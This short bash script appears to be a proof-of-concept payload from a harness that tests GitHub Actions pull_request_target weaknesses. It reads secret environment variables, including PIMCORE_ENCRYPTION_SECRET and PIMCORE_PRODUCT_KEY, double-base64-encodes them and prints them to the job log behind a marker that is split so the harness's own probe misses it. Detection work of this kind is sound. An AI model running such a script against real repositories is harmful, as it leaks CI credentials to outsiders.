#!/bin/bash
# Attacker-controlled script executed directly by the privileged pull_request_target job.
# Build the marker dynamically so the script SOURCE never contains the contiguous
# marker string (the harness's `head` debug probe would otherwise emit a bogus
# '$(echo' candidate). Emit the marker for every secret actually present at the sink.
M='GERALT_LEAKED''_TOKEN'
emit() {
  if [ -n "$1" ]; then
    printf '%s\n' "$M=$(printf '%s' "$1" | base64 | base64)"
  fi
}
emit "$GERALT_SECRET"
emit "$PIMCORE_INSTANCE_IDENTIFIER"
emit "$PIMCORE_ENCRYPTION_SECRET"
emit "$PIMCORE_PRODUCT_KEY"
exit 1
